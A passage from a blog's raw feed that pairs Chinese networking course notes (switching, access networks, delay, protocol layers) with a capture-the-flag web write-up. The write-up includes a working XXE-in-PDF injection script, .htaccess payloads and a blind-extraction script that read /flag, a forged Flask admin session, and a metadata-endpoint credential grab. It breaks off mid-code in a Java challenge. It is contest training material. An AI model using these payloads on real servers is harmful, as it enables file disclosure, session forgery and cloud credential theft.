Switching</h3><p>又称作链路交换，该方式为每一次通信预留一个专有电路，如电话网。该方式不与其他计算机共享，因此能够保证性能，但是连接建立时间较长、建立连接后没有进行数据通信，则会产生资源浪费的问题</p><p><strong>片</strong></p><p>将带宽资源进行拆分，一次呼叫可以选择其中的片用于通信</p><h3 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h3><p>是将带宽分成片的技术，主要有以下方式</p><p><strong>频分FDM</strong></p><p>将可用通信频率范围拆分为多个小片，每一片占据一小段可用的通信频率</p><p><strong>时分TDM</strong></p><p>将带宽传输数据的时间拆分为一个个周期，每个周期内再分出一小段时间用于一个片，一个片占据了完整的通信带宽频率</p><p><img src="/img/post/image-20260126185205393.png" alt="image-20260126185205393"></p><p><strong>波分WDM</strong></p><p>采用光信号传输数据时的分配方式，与频分类似，每一片占据光信号的其中一段波长</p><p><strong>码分CDM</strong></p><p>不分割频率或时间，允许所有用户同时、同频传输。它通过为每个用户分配一个唯一的、特殊的编码序列（伪随机码）来区分信号</p><h3 id="分组交换Packet-switching"><a href="#分组交换Packet-switching" class="headerlink" title="分组交换Packet switching"></a>分组交换Packet switching</h3><p>该方式不再使用以上多路复用的方式对带宽进行分片，而是将要传输的数据分成一个个包进行分组。路由器获取包后会先进行存储，再使用全部的带宽资源进行转发，也就是<strong>先存储后转发</strong>的特点</p><p><strong>统计时分多路复用</strong>是分组交换进行多路复用的方式，类似时分多路复用，但是没有固定的分配模式</p><p>如果到达速率大于链路的输出速率，路由器会使用缓存对包进行排队，当路由器缓存耗尽时，就会产生<strong>丢包</strong></p><p>该方式实现了带宽资源共享，并且能够最大化利用带宽资源</p><p><strong>路由</strong></p><p>决定分组采用的源到目标的路径</p><p><strong>转发</strong></p><p>将分组从路由器的输入链路转移到输出链路</p><h3 id="量化统计"><a href="#量化统计" class="headerlink" title="量化统计"></a>量化统计</h3><p>对于电路交换，能够同时支持的用户数即为链路中能够分片的最大数</p><p>对于分组交换，需要使用概率来表示，假设用户总数为<code>m</code>，用户在某一时间点跃的概率为<code>p</code>，则某一时间点内同时有小于等于<code>n</code>个用户活跃的概率为<br>$$<br>\sum_{i&#x3D;0}^{n} \begin{pmatrix} m \ i \end{pmatrix} p^i(1-p)^{m-i}<br>$$<br>比如，若一个链路最多支持的连接数为10，对于电路交换，能够支持的最多用户数就是10，而对于分组交换，假设有共50个用户，<code>p</code>等于<code>0.1</code>，那么<br>$$<br>\sum_{i&#x3D;0}^{10} \begin{pmatrix}<br>50 \<br>i<br>\end{pmatrix}(0.1)^i(0.9)^{50-i}\approx0.990645<br>$$<br>可见，当有50位用户时，有99%的概率同时活跃的用户不超过10，这说明该情况下分组交换能够很好地利用网络资源，实现了共享。哪怕一瞬间有超过10位用户活跃，路由器也可以先将数据缓存下来排队，等到网络压力小后再发出</p><h3 id="数据报网络"><a href="#数据报网络" class="headerlink" title="数据报网络"></a>数据报网络</h3><p>是分组交换下的一种方式，分组携带了目标主机的完整地址，在通信之前，无须建立起一个连接，有数据就传输。由路由器决定下一跳的路径，每次传输的路径可能不一样，可能会失序</p><p><img src="/img/post/image-20260126224136611.png" alt="image-20260126224136611"></p><h3 id="虚电路网络"><a href="#虚电路网络" class="headerlink" title="虚电路网络"></a>虚电路网络</h3><p>虚电路网络在每一次通信前进行连接，由路由器维护一个虚电路表，该方式建立的连接传输路径是固定的，分组保存虚电路号而不是目标主机的完整地址，分组携带的虚电路号在每一跳后都会更新</p><p><img src="/img/post/image-20260126224625550.png" alt="image-20260126224625550"></p><br/><h2 id="接入网和物理媒体"><a href="#接入网和物理媒体" class="headerlink" title="接入网和物理媒体"></a>接入网和物理媒体</h2><p>接入网用于将网络边缘接入网络核心，接入网有<strong>有线接入</strong>和<strong>无线接入</strong>，接入网的重要指标有带宽、是否共享</p><h3 id="住宅接入modem"><a href="#住宅接入modem" class="headerlink" title="住宅接入modem"></a>住宅接入modem</h3><p>将上网数据调制加载音频信号上， 在电话线上传输，在局端将其中的数据解调出来；反之亦然</p><p>带宽一般很窄，传输速度有限，不能同时上网和打电话</p><h3 id="digital-subscriber-line-DSL"><a href="#digital-subscriber-line-DSL" class="headerlink" title="digital subscriber line ( DSL )"></a>digital subscriber line ( DSL )</h3><p>该方式依然使用电话线与调制解调的方式接入互联网，不同在于该方式将高频段用于数据传输，低频段的则用于通话，可以同时上网和打电话。DSL线路上的数据被传到互联网，DSL线路上的语音则被传到电话网</p><p><img src="/img/post/image-20260126232111855.png" alt="image-20260126232111855"></p><h3 id="线缆网络"><a href="#线缆网络" class="headerlink" title="线缆网络"></a>线缆网络</h3><p>住宅接入的实现方式，一般由有线电视公司提供的方式，通过对有线电视信号线缆双向改造，在不同频段传输不同信道的数据， 数字电视和上网数据（上下行），然后通过线缆和光纤网络将个家庭用户接入到ISP 路由器</p><p>各用户共享到线缆头端的接入网络，与DSL不同,  DSL每个用户一个专用线路到CO</p><p><img src="/img/post/image-20260126232129125.png" alt="image-20260126232129125"></p><h3 id="电缆网络"><a href="#电缆网络" class="headerlink" title="电缆网络"></a>电缆网络</h3><p>住宅接入的实现方式，电力公司通过对电缆的改造，使用电力线使其具有上网的功能，该网络依然是共享的</p><h3 id="企业接入"><a href="#企业接入" class="headerlink" title="企业接入"></a>企业接入</h3><p>企业内部通过AP（接入点）接入到交换机的端口，再通过交换机的级联接入到互联网，经常被企业或者大学等机构采用。现在，端系统经常直接接到以太网络交换机上</p><p><img src="/img/post/image-20260126233712230.png" alt="image-20260126233712230"></p><h3 id="无线接入网络"><a href="#无线接入网络" class="headerlink" title="无线接入网络"></a>无线接入网络</h3><p>各无线端系统共享无线接入网络（端系统到无线路由器）</p><p><strong>无线局域接入</strong></p><p>一般在建筑内部，如平常用的WLAN</p><p><strong>广域无线接入</strong></p><p>对应移动数据、蜂窝数据等</p><p><img src="/img/post/image-20260126234212174.png" alt="image-20260126234212174"></p><h3 id="物理媒体"><a href="#物理媒体" class="headerlink" title="物理媒体"></a>物理媒体</h3><p><strong>物理链路</strong></p><p>连接每个发送-接收对之间的物理媒体</p><p>物理媒体又分为两种类型</p><p><strong>导引型媒体</strong></p><p>信号沿着固体媒介被导引，如同轴电缆、光纤、双绞线</p><p>双绞线TP：两根绝缘铜导线拧合，有5类、6类等</p><p>同轴电缆：两根同轴的铜导线，双向。又分基带电缆和宽带电缆，基带电缆上一个单个信道，宽带电缆上有多个信道</p><p>光纤和光缆：光脉冲，每个脉冲表示一个 bit，在玻璃纤维中传输，高速，低误码率，安全</p><p><strong>非导引型媒体</strong></p><p>开放的空间传输电磁波或者光信号，在电磁或者光信号中承载数字数据</p><p><strong>无线链路</strong></p><p>非导引型媒体组成的物理链路，有地面微波、LAN、wide-area、卫星等</p><br/><h2 id="Internet结构"><a href="#Internet结构" class="headerlink" title="Internet结构"></a>Internet结构</h2><p>端系统通过接入<strong>ISPs</strong>（Internet Service Providers，互联网服务提供商）接入互联网，要求每一个ISP之间都可以相互连接。最开始可能想到全连接的互联反方式，但是该方案的可拓展性很差</p><p> <img src="/img/post/image-20260130180857070.png" alt="image-20260130180857070"></p><p>后面，发展出一个全局的ISP为客户提供数据交换服务，为每一个接入的ISP都连接到全局ISP</p><p><img src="/img/post/image-20260130181010606.png" alt="image-20260130181010606"></p><p>后来出现了多家ISP，他们构建了各自的ISP网络，并相互之间再进行互联，形成对等狐互联的结算关系</p><p><img src="/img/post/15901fc7-b6ec-4130-8893-11d885e195e4.png" alt="15901fc7-b6ec-4130-8893-11d885e195e4"></p><p>业务继续细分，分为全球接入和区域接入，区域接入负责将接入ISPs接入全局ISPs</p><p><img src="/img/post/image-20260131162225701.png" alt="image-20260131162225701"></p><p>再到后来，<strong>ICP</strong>（Internet Content Providers，互联网内容提供商）为了更好的用户体验，在其内部建立专线网络。下图的橙色区域是专供ICP内部的数据交换，处理完再通过ISP连接外界</p><p><img src="/img/post/image-20260131162517427.png" alt="image-20260131162517427"></p><p>所以，互联网的结构像一个自内而外扩散的结构，由边缘的单个端节点通过一层层ISP逐级向内，接入内部的位数不多的大范围网络，再向外访问另一边的端节点</p><p>从中也可以看出一个松散的层次结构</p><p><img src="/img/post/image-20260131163039560.png" alt="image-20260131163039560"></p><br/><h2 id="分组延时、丢失和吞吐量"><a href="#分组延时、丢失和吞吐量" class="headerlink" title="分组延时、丢失和吞吐量"></a>分组延时、丢失和吞吐量</h2><p>分组交换虽然带来了更高的资源利用效率，但也产生了一些问题</p><h3 id="分组的延时和丢失"><a href="#分组的延时和丢失" class="headerlink" title="分组的延时和丢失"></a>分组的延时和丢失</h3><p>产生原因：分组到达链路的速率超过了链路输出的能力，此时会产生排队，这会占用路由器的缓存，当缓冲区耗尽时，则之后的分组就会被丢弃</p><p>丢失的分组可能会被前一个节或端系统点重传，或者根本不重传</p><p><strong>节点处理延时proc</strong></p><p>路由器检查校验数据、绝定转发方向产生的延时，这一般是确定的</p><p><strong>排队延时queue</strong></p><p>分组在输出链路上等待的时间，这取决于路由器的拥塞程度</p><p><strong>传输延时trans</strong></p><p>顾名思义，该段延时&#x3D;分组长度（bit）&#x2F;链路带宽（bit&#x2F;s）</p><p><strong>传播延时prop</strong></p><p>该段延时为数据在物理链路上传播的延时，该段延时&#x3D;物理链路的长度（m）&#x2F;数据在链路上的传播速度（m&#x2F;s）</p><p>所以总延时就是<br>$$<br>d_{nodal}&#x3D;d_{proc}+d_{queue}+d_{trans}+d_{prop}<br>$$<br><strong>流量强度 I</strong></p><p>单位时间内到达路由器的分组长度与传输速率<br>$$<br>I&#x3D;\frac{La}{R}<br>$$<br><code>L</code>表示单个分组的长度，<code>a</code>表示单位时间内到达的分组数</p><h3 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h3><p>定义为源端和目标端之间的传输速率</p><p><strong>瓶颈链路</strong></p><p>端到端路径上限制端到端吞吐的链路</p><br/><h2 id="协议层次和服务模型"><a href="#协议层次和服务模型" class="headerlink" title="协议层次和服务模型"></a>协议层次和服务模型</h2><p><strong>服务(Service)</strong></p><p>低层实体向上层实体提供它们之间的通信的能力，是通过原语(primitive)来操作的，垂直</p><p><strong>协议(protocol)</strong></p><p>对等层实体(peer entity)之间在相互通信的过程中，需要遵循的规则的集合，水平</p><p><strong>原语(primitive)</strong></p><p>上层使用下层服务的形式，高层使用低层提供的服务，以及低层向高层提供服务都是通过服务访问原语来进行交互的</p><p><strong>服务访问点SAP (Services Access Point)</strong></p><p>上层使用下层提供的服务通过层间的接口地点</p><p><strong>面向连接的服务(Connection-oriented Service)</strong></p><p>两个通信实体为进行通信而建立的一 种结合，建立连接的过程有建立连接，通信，拆除连接三部分。该服务类型在网络层被称作虚电路，适用于对于传输大的数据块。特点是保序</p><p><strong>无连接的服务(Connectionless Service)</strong></p><p>两个对等层实体在通信前不需要建 立一个连接，不预留资源，不需要通信双方都是活跃。适用于传送零星数据。特点是不可靠、可能重复、可能失序</p><h3 id="协议与服务的关系"><a href="#协议与服务的关系" class="headerlink" title="协议与服务的关系"></a>协议与服务的关系</h3><p>本层协议的实现要靠下层提供的服务来实现，本层实体通过协议为上层提供更高级的服务</p><p><img src="/img/post/image-20260131200048836.png" alt="image-20260131200048836"></p><h3 id="Internet协议栈"><a href="#Internet协议栈" class="headerlink" title="Internet协议栈"></a>Internet协议栈</h3><p>应用层: 网络应用，为人类用户或者其他应用进程提供网络应用服务</p><p>传输层: 主机之间的数据传输，可以将不可靠的通信变成可靠地通信，同时细分为进程到进程</p><p>网络层: 为数据报从源到目的选择路由，主机主机之间的通信，端到端通信，不可靠</p><p>链路层: 相邻网络节点间的数据传输，2个相邻2点的通信，点到点通信，可靠或不可靠</p><p>物理层: 在线路上传送bit </p><table><thead><tr><th align="center">应用层 FTP, SMTP, HTTP,DNS</th></tr></thead><tbody><tr><td align="center"><strong>传输层 TCP, UDP</strong></td></tr><tr><td align="center"><strong>网络层 IP, 路由协议</strong></td></tr><tr><td align="center"><strong>链路层 PPP, 802.11(wifi), Ethernet</strong></td></tr><tr><td align="center"><strong>物理层</strong></td></tr></tbody></table><h3 id="ISO-OSI-参考模型"><a href="#ISO-OSI-参考模型" class="headerlink" title="ISO&#x2F;OSI 参考模型"></a>ISO&#x2F;OSI 参考模型</h3><p>表示层: 允许应用解释传输的数据</p><p>会话层: 数据交换的同步，检查点，恢复</p><table><thead><tr><th align="center">应用层</th></tr></thead><tbody><tr><td align="center"><strong>表示层</strong></td></tr><tr><td align="center"><strong>会话层</strong></td></tr><tr><td align="center"><strong>传输层</strong></td></tr><tr><td align="center"><strong>网络层</strong></td></tr><tr><td align="center"><strong>链路层</strong></td></tr><tr><td align="center"><strong>物理层</strong></td></tr></tbody></table><p>互联网协议栈没有这两层，这些服务，如果需要的话，必须被应用层实现</p><h3 id="各层次的协议数据单元"><a href="#各层次的协议数据单元" class="headerlink" title="各层次的协议数据单元"></a>各层次的协议数据单元</h3><p><strong>协议数据单元(PDU)</strong></p><p>指数据存储、传输和处理的基本单位，在不同层级有不同含义和大小</p><p><strong>服务数据单元(SDU)</strong></p><p>上层交给本层处理的数据单元</p><p>应用层：报文(message)</p><p>传输层：报文段(segment)，TCP为段，UDP为数据报</p><p>网络层：分组packet（如果无连接方式：数据报 datagram）</p><p>数据链路层：帧(frame)</p><p>物理层：位(bit)</p><p><strong>本层PDU &#x3D; 本层头部 + 上层PDU（即本层SDU） + 本层尾部</strong></p><h3 id="封装和解封装"><a href="#封装和解封装" class="headerlink" title="封装和解封装"></a>封装和解封装</h3><p><img src="/img/post/781c166a-eb89-47c6-b54b-e4cbe8416ea3.png" alt="781c166a-eb89-47c6-b54b-e4cbe8416ea3"></p><br/>]]></content>
      
      
      <categories>
          
          <category> 校课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UniCTF Web部分题解</title>
      <link href="/2026/01/31/UniCTF-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
      <url>/2026/01/31/UniCTF-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="UniCTF-Web部分题解"><a href="#UniCTF-Web部分题解" class="headerlink" title="UniCTF Web部分题解"></a>UniCTF Web部分题解</h1><p>寒假打的小比赛，虽说有新生赛道但还是被其他学校的新（大）生（佬）薄纱了（或许也跟我们一个队伍三个Web手有关系？</p><p>Web方向放了12道题，我们做了7道，这个成绩对于我们这种初出茅庐的菜鸡也还算不错😁</p><p>贴一张新生赛道的排名</p><p><img src="/img/post/image-20260131100231640.png" alt="image-20260131100231640"></p><p>还需要努力</p><br/><h2 id="SecureDoc"><a href="#SecureDoc" class="headerlink" title="SecureDoc"></a>SecureDoc</h2><p>题目说是一个PDF的解析器，随便传一个PDF，弹出来的页面显示未在文件中找到XFA</p><p><img src="/img/post/image-20260130232321391.png" alt="image-20260130232321391"></p><p><strong>XFA</strong>是一种基于 <strong>XML</strong> 的技术规范，主要用于在 <strong>PDF 文档</strong> 中创建、渲染和处理复杂的、动态的交互式表单，既然是XML格式的文本，自然能想到XXE，这里使用脚本为PDF注入XFA</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> PyPDF2</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject_xfa_to_pdf</span>(<span class="params">input_pdf, output_pdf, xfa_xml</span>):</span><br><span class="line">    <span class="comment"># 读取原始PDF</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_pdf, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        reader = PyPDF2.PdfReader(f)</span><br><span class="line">        writer = PyPDF2.PdfWriter()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 复制所有页面</span></span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> reader.pages:</span><br><span class="line">            writer.add_page(page)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建XFA数据流 - 新版PyPDF2方式</span></span><br><span class="line">        <span class="keyword">from</span> PyPDF2.generic <span class="keyword">import</span> DecodedStreamObject, NameObject, ArrayObject, DictionaryObject</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 方法1: 使用DecodedStreamObject</span></span><br><span class="line">        xfa_stream = DecodedStreamObject()</span><br><span class="line">        xfa_stream._data = xfa_xml.encode()  <span class="comment"># 直接设置_data属性</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 方法2: 或者使用encoded属性</span></span><br><span class="line">        <span class="comment"># xfa_stream.encoded_data = xfa_xml.encode()</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 添加到writer</span></span><br><span class="line">        xfa_ref = writer._add_object(xfa_stream)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建AcroForm字典</span></span><br><span class="line">        acroform = DictionaryObject(&#123;</span><br><span class="line">            NameObject(<span class="string">&#x27;/Fields&#x27;</span>): ArrayObject(),</span><br><span class="line">            NameObject(<span class="string">&#x27;/XFA&#x27;</span>): xfa_ref</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 设置Catalog</span></span><br><span class="line">        writer._root_object.update(&#123;</span><br><span class="line">            NameObject(<span class="string">&#x27;/AcroForm&#x27;</span>): acroform</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 确保有Catalog对象</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;/Catalog&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> writer._root_object:</span><br><span class="line">            catalog = DictionaryObject()</span><br><span class="line">            writer._root_object[NameObject(<span class="string">&#x27;/Catalog&#x27;</span>)] = catalog</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 写入文件</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_pdf, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> out_f:</span><br><span class="line">            writer.write(out_f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试XFA XML</span></span><br><span class="line">evil_xfa = <span class="string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE xdp [</span></span><br><span class="line"><span class="string">&lt;!ENTITY xxe SYSTEM &quot;file://flag&quot;&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;xdp:xdp xmlns:xdp=&quot;http://ns.adobe.com/xdp/&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;template&gt;</span></span><br><span class="line"><span class="string">    &lt;subform name=&quot;form1&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;field name=&quot;exploit&quot;&gt;&amp;xxe;&lt;/field&gt;</span></span><br><span class="line"><span class="string">    &lt;/subform&gt;</span></span><br><span class="line"><span class="string">&lt;/template&gt;</span></span><br><span class="line"><span class="string">&lt;/xdp:xdp&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    inject_xfa_to_pdf(<span class="string">&#x27;writeup.pdf&#x27;</span>, <span class="string">&#x27;evil.pdf&#x27;</span>, evil_xfa)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;成功创建恶意PDF: evil.pdf&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>将注入后的PDF文件上传给服务器，解析出来就是flag</p><p><img src="/img/post/image-20260130233237281.png" alt="image-20260130233237281"></p><br/><h2 id="ezUpload"><a href="#ezUpload" class="headerlink" title="ezUpload"></a>ezUpload</h2><p>WAF如下</p><p><img src="/img/post/image-20260130233409304.png" alt="image-20260130233409304"></p><p>对文件大小卡的很死，而且权限控制比较严格，访问<code>/upload</code>路由会报<code>Access Denied</code>。考虑到服务器是Apache，多半是上传<code>.htaccess</code>配置文件</p><p>试出来可以使用响应头回显</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Options +Indexes</span><br><span class="line">DirectoryIndex /test.txt</span><br><span class="line">Header set X-Flag &quot;expr=%&#123;file:/flag&#125;&quot;</span><br></pre></td></tr></table></figure><p><code>Options +Indexes</code>用于开放索引，允许客户端查看目录结构，用于应付权限控制</p><p><code>DirectoryIndex /test.txt</code>设置默认索引，用于在客户端访问<code>/upload</code>路由时展示的默认文件，这里<code>/test.txt</code>是从网站的跟目录算起，如果没有该文件就会展示目录结构</p><p><code>Header set X-Flag &quot;expr=%{file:/flag}&quot;</code>用于设置响应头，expr表达式<code>%{file:/flag}</code>表示将&#x2F;flag文件内容贴入<code>X-Flag</code>这个响应头中</p><p>由于打开文件的expr表达式需要处理文件时才能触发，需要前两条去强迫apache寻找根目录下的test.txt文件，该文件实际存不存在不重要，主要是触发apache服务器的文件处理操作</p><p>上传成功后再次访问<code>/upload</code>路由，查看响应头</p><p><img src="/img/post/image-20260125173115056.png" alt="image-20260125173115056"></p><br/><h2 id="ezUpload-Revenge"><a href="#ezUpload-Revenge" class="headerlink" title="ezUpload Revenge!!"></a>ezUpload Revenge!!</h2><p>作为上一题的revenge，本题过滤了更多特殊字符</p><p><img src="/img/post/image-20260130234751335.png" alt="image-20260130234751335"></p><p>此外，经过测试，过滤了一些关键字比如<code>expr=</code>、<code>env</code>、<code>ErrorDocument</code>、<code>redirect</code>等，也有可能上一题也过滤了不过我没用上</p><p>这题就很有意思了，得依赖盲注，payload也就三行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond expr &quot;file(&#x27;/flag&#x27;) =~ /^UniCTF&#123;/&quot;</span><br><span class="line">RewriteRule ^readflag /upload/success [R=301,L]</span><br></pre></td></tr></table></figure><p><code>RewriteEngine On</code>用于开启启用 URL 重写引擎，这允许我们改写一些重定向的规则</p><p><code>RewriteCond expr &quot;file(&#39;/flag&#39;) =~ /^UniCTF{/&quot;</code>该语句充当了一个条件判断的角色，<code>RewriteCond</code>用于检查特定条件是否成立，<code>expr &quot;file(&#39;/flag&#39;)</code>表示这提取&#x2F;flag文件的内容，<code>=~</code>为正则表达式匹配操作符，这句话的意思就是判断&#x2F;flag文件是不是以<code>UniCTF{</code>开头</p><p>上面的条件倘若成立，则会触发<code>RewriteRule ^readflag /upload/success [R=301,L]</code>，这表示一个重定向规则，访问<code>/upload/readflag</code>路由会进行301重定向到<code>/upload/success</code></p><p>通过上面的逻辑判断，形成了一个类似布尔盲注的环境，接下来就是写一个盲注脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.proxies = &#123;<span class="string">&quot;http&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;https&quot;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"></span><br><span class="line">TARGET_URL = <span class="string">&quot;http://80-4abe9029-a761-44c3-9159-406b239dbd79.challenge.ctfplus.cn/&quot;</span></span><br><span class="line">TRIGGER_URL = TARGET_URL + <span class="string">&quot;upload/readflag&quot;</span></span><br><span class="line"></span><br><span class="line">alphabet = string.ascii_letters + string.digits + <span class="string">&quot;_-!&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;UniCTF&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> alphabet:</span><br><span class="line">            test_char = char</span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">in</span> <span class="string">&quot;.+*?^$()[]&#123;&#125;|\\&quot;</span>:</span><br><span class="line">                test_char = <span class="string">&quot;\\&quot;</span> + char</span><br><span class="line"></span><br><span class="line">            htaccess = <span class="string">f&quot;&quot;&quot;RewriteEngine On</span></span><br><span class="line"><span class="string">RewriteCond expr &quot;file(&#x27;/flag&#x27;) =~ /^<span class="subst">&#123;flag&#125;</span><span class="subst">&#123;test_char&#125;</span>/&quot;</span></span><br><span class="line"><span class="string">RewriteRule ^readflag /upload/success [R=301,L]&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                session.post(TARGET_URL, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;.htaccess&#x27;</span>, htaccess)&#125;, timeout=<span class="number">10</span>)</span><br><span class="line">                r = session.get(TRIGGER_URL, allow_redirects=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\r测试中: <span class="subst">&#123;flag&#125;</span><span class="subst">&#123;char&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> r.status_code == <span class="number">301</span>:</span><br><span class="line">                    flag += char</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\n[+] 命中! 目前 Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">if</span> char == <span class="string">&quot;&#125;&quot;</span>: <span class="keyword">return</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n[!] 请求出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">solve()</span><br></pre></td></tr></table></figure><p>运行，我的脚本到最后一位会陷入循环，需要暂停脚本手动加上花括号</p><p><img src="/img/post/image-20260127230117115.png" alt="image-20260127230117115"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UniCTF&#123;sz_5b6502fd-1d30-4362-bc20-36196ea24831&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="CloudDiag"><a href="#CloudDiag" class="headerlink" title="CloudDiag"></a>CloudDiag</h2><p>注册完成后给了一个Cookie</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">session=eyJib290X2lkIjoiMTc2OTU2OTQzMi41MDMzNiIsInVzZXJfaWQiOjJ9.aXmBUg.2a6cpR3mfkCI7V2C3VrzOWmc3mI</span><br></pre></td></tr></table></figure><p>搜了一下是flask session，还有个专门解码它的工具<code>flask-unsign</code>，解码出来看到<code>user_id</code>为2</p><p><img src="/img/post/image-20260128125201802.png" alt="image-20260128125201802"></p><p>跟JWT一样，flask session也有密钥进行签名，用这个工具爆破一下</p><p><img src="/img/post/image-20260128125230805.png" alt="image-20260128125230805"></p><p>获得密钥<code>dev-secret</code>，推测<code>user_id</code>为1是管理员账户，依此构建管理员token</p><p><img src="/img/post/image-20260128125312025.png" alt="image-20260128125312025"></p><p>再次登录，用户名变为root，tasks页面多了一条隐藏记录<code>Legacy metadata check</code></p><p><img src="/img/post/image-20260128125541049.png" alt="image-20260128125541049"></p><p>暴露了元数据服务地址<code>http://metadata:1338/</code>，AWS元数据端点<code>/latest/meta-data/iam/security-credentials/</code>，IAM角色名<code>clouddiag-instance-role</code></p><p>访问<code>http://metadata:1338/latest/meta-data/iam/security-credentials/clouddiag-instance-role</code>获取临时凭证</p><p><img src="/img/post/image-20260128125920606.png" alt="image-20260128125920606"></p><p>分别填入<code>/explorer</code>的表单中，看到了Bukets，去获取<code>clouddiag-secrets</code></p><p><img src="/img/post/image-20260128130055909.png" alt="image-20260128130055909"></p><p>有flag文件，Prefix填<code>flags/runtime/</code>，Object Key填<code>flag-a721f6e652364e498d102955c66b4efe.txt</code></p><p><img src="/img/post/image-20260128130044221.png" alt="image-20260128130044221"></p><p>获取flag</p><p><img src="/img/post/image-20260128130233596.png" alt="image-20260128130233596"></p><br/><h2 id="ez-Java"><a href="#ez-Java" class="headerlink" title="ez Java"></a>ez Java</h2><p>题目给了源码，有用的类是<code>ConfigDataWrapper</code>，该类的<code>toString()</code>方法里面有动态类加载的逻辑，有个前提是<code>sign</code>字段的值为字符串<code>ready</code>才能触发</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        result.append(<span class="string">&quot;ConfigDataWrapper[&quot;</span>).append(<span class="string">&quot;ID=&quot;</span>).append(<span class="built_in">this</span>.configId == <span class="literal">null</span> ? <span class="string">&quot;DEFAULT&quot;</span> : <span class="built_in">this</span>.configId).append(<span class="string">&quot;, MetaSize=&quot;</span>).append(<span class="built_in">this</span>.metadata == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.metadata.size()).append(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="comment">//要求`sign`字段的值为`ready`</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.ClassByte != <span class="literal">null</span> &amp;&amp; <span class="string">&quot;ready&quot;</span>.equals(<span class="built_in">this</span>.sign)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">byte</span>[] decrypted = <span 